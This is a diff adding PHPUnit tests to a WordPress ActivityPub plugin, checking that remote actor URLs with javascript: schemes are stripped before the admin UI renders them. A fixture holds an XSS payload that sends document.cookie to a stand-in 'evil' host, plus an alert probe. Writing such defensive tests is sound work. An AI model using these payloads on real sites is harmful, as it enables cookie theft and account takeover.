@@ -7,6 +7,7 @@
 
 namespace Activitypub\Tests;
 
+use Activitypub\Collection\Remote_Actors;
 use Activitypub\Post_Types;
 
 /**
@@ -59,5 +60,81 @@ class Test_Post_Types extends \WP_UnitTestCase {
 		$this->assertFalse( $post_type->show_in_rest );
 		$this->assertFalse( $post_type->delete_with_user );
 		$this->assertTrue( $post_type->exclude_from_search );
+	}
+
+	/**
+	 * A remote actor's URL and icon are attacker-controlled and stored verbatim,
+	 * so the actor_info REST field must strip script-executing schemes before the
+	 * admin UI renders them as links.
+	 *
+	 * @covers ::register_ap_actor_rest_field
+	 */
+	public function test_actor_info_rest_field_sanitizes_dangerous_urls() {
+		Post_Types::register_ap_actor_rest_field();
+
+		$post_id = Remote_Actors::create(
+			array(
+				'id'                => 'https://remote.example.com/actor/mallory',
+				'type'              => 'Person',
+				'url'               => "javascript:fetch('//evil/?c='+document.cookie)",
+				'icon'              => array(
+					'type' => 'Image',
+					'url'  => 'javascript:alert(document.domain)',
+				),
+				'inbox'             => 'https://remote.example.com/actor/mallory/inbox',
+				'name'              => 'Mallory',
+				'preferredUsername' => 'mallory',
+			)
+		);
+		$this->assertIsInt( $post_id );
+
+		$info = $this->get_actor_info( $post_id );
+
+		$this->assertSame( '', $info['url'], 'A javascript: actor URL should be stripped.' );
+		$this->assertSame( '', $info['icon'], 'A javascript: icon URL should be stripped.' );
+	}
+
+	/**
+	 * Legitimate http(s) actor URLs must pass through the actor_info REST field untouched.
+	 *
+	 * @covers ::register_ap_actor_rest_field
+	 */
+	public function test_actor_info_rest_field_preserves_safe_urls() {
+		Post_Types::register_ap_actor_rest_field();
+
+		$post_id = Remote_Actors::create(
+			array(
+				'id'                => 'https://remote.example.com/actor/alice',
+				'type'              => 'Person',
+				'url'               => 'https://remote.example.com/@alice',
+				'icon'              => array(
+					'type' => 'Image',
+					'url'  => 'https://remote.example.com/avatar.png',
+				),
+				'inbox'             => 'https://remote.example.com/actor/alice/inbox',
+				'name'              => 'Alice',
+				'preferredUsername' => 'alice',
+			)
+		);
+		$this->assertIsInt( $post_id );
+
+		$info = $this->get_actor_info( $post_id );
+
+		$this->assertSame( 'https://remote.example.com/@alice', $info['url'] );
+		$this->assertSame( 'https://remote.example.com/avatar.png', $info['icon'] );
+	}
+
+	/**
+	 * Invoke the registered actor_info REST field callback for a given actor post.
+	 *
+	 * @param int $post_id Remote actor post ID.
+	 * @return array The actor_info payload.
+	 */
+	private function get_actor_info( $post_id ) {
+		global $wp_rest_additional_fields;
+
+		$callback = $wp_rest_additional_fields[ Remote_Actors::POST_TYPE ]['actor_info']['get_callback'];
+
+		return \call_user_func( $callback, array( 'id' => $post_id ) );
 	}
 }
